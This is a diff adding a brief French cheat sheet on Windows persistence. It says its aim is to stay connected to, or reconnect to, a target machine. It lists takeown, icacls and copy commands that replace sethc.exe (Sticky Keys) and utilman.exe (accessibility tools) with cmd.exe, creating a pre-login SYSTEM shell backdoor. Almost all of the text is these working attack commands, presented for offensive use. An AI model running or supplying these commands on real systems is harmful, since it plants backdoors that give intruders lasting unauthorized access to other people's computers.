@@ -1,0 +1,16 @@
+--->WINDOWS PERSISTANCE
+
+--->Permet de rester connecter ou de se reconnecter facilement à la cible
+-->Exploiter sethc ou ultiman
+
+Dans Powershell:
+
+->sethc.exe, 5fois la touche shift (touches rémanentes)
+takeown /f c:\Windows\System32\sethc.exe
+icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+
+->ultiman.exe, outils d'accessibilitées
+takeown /f c:\Windows\System32\utilman.exe
+icacls C:\Windows\System32\utilman.exe /grant Administrator:F
+copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
